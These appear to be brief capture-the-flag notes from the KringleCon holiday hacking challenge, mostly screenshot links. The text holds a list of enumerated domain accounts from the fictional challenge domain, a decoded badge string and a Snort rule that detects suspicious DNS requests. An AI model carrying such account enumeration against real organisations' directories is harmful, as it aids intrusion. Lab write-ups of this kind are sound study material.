![](images/2018-12-24-18-50-43.png)

```
Administrator@EM.KRINGLECON.COM
HealthMailboxbe58608@EM.KRINGLECON.COM
HealthMailboxbe58608d4925422d8e4ea458cfedc612@EM.KRINGLECON.COM
HealthMailboxbab78a6@EM.KRINGLECON.COM
minty.candycane@EM.KRINGLECON.COM
```

![](images/2018-12-24-19-03-17.png)


# KIOSK

![](images/2018-12-24-19-20-05.png)

# Badge

`oRfjg5uGHmbduj2m` 
`6f 52 66 6a 67 35 75 47 48 6d 62 64 75 6a 32 6d 0a`
`A  L  A  B  A  S  T  E  R  S  N  O  W  B  A  L  L`

![](images/2018-12-26-21-46-28.png)

![](images/2018-12-26-21-47-02.png)

# Passcode

![](images/2018-12-26-20-29-00.png)

![](images/2018-12-26-20-29-32.png)

# SNORT

`alert udp any any -> any any (msg:"DNS request for malicious content"; sid:10000006; rev:001; content:"|37 37 36|"; rawbytes;)`

![](images/2018-12-27-10-00-56.png)


# Google challenge 

![](images/2019-01-02-14-27-27.png)

![](images/2019-01-02-14-27-49.png)

![](images/2019-01-02-14-28-42.png)

![](images/2019-01-02-14-29-06.png)

![](images/2019-01-02-15-24-14.png)

![](images/2019-01-02-15-24-36.png)